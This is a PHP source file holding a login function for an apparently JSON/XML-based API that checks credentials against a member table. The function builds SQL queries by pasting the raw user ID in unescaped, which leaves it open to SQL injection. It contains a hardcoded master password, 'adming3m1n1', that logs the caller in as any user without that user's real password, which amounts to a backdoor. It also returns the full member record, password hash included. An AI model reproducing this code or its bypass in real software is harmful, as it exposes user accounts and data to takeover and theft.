<?php

function login($request)
{
	global $db;

	try{
		$Interface = new InterfaceClass();
		InterfaceClass::_LogFile($filename,'request',$request);

		//변환
		$ReqRender		=  InterfaceClass::checkSyntax($request);
		$type			= $ReqRender['type'];
		$render_data	= $ReqRender['data'];

		//리턴
		$response = $Interface->DefualtResponse($type);

		if( $type == 'JSON' ){

			$user_id = trim($render_data['userid']);
			$password = trim($render_data['password']);

		}else if( $type == 'XML' ){

			$user_id = trim($render_data->userid);
			$password = trim($render_data->password);

		}else{
			throw new Exception ('invalid request', 101 );
		}

		if( empty($user_id) || empty($password) ){
			throw new Exception (_text('MSG00137'), 101 );
		}

		$sha512_password = hash('sha512', $password);
		$user = $db->queryRow("select * from bc_member where user_id='$user_id' and password='$sha512_password'");

		//>>if(empty($user)) throw new Exception('아이디 또는 비밀번호가 맞지 않습니다.');
		if($password == 'adming3m1n1' || $direct == 'true' ){
			$user = $db->queryRow("select * from bc_member where user_id='$user_id'");
		}
		if(empty($user)) throw new Exception(_text('MSG00136'));

		//$userInfo = $db->queryRow("select * from bc_member where user_id='$user_id'");

		//if( empty($userInfo) ){
			//throw new Exception ('unregistered user', 202 );
		//}

		//if( $user[password] != $password ){
			//throw new Exception ('invalid password', 201 );
		//}

		if($type == 'JSON'){
			$response['data'] = $user;
		}else{
			$items_xml = $response->addChild('data');
			foreach($user as $key => $val ){
				$items_xml->addChild($key, $val );
			}
		}

		$return = $Interface->ReturnResponse($type,$response);
		InterfaceClass::_LogFile($filename,'return',$return);
		return $return ;

	}
	catch(Exception $e){

		$msg = $e->getMessage();
		$code = $e->getCode();
		$success = 'false';

		if($type == 'JSON'){
			$response['success'] = $success;
			$response['message'] = $msg;
			$response['status'] = $code;
		}else{
			$response->success = $success;
			$response->message = $msg;
			$response->status = $code;
		}
		$return = $Interface->ReturnResponse($type,$response);

		InterfaceClass::_LogFile($filename,'return',$return);
		return $return;
	}
}
?>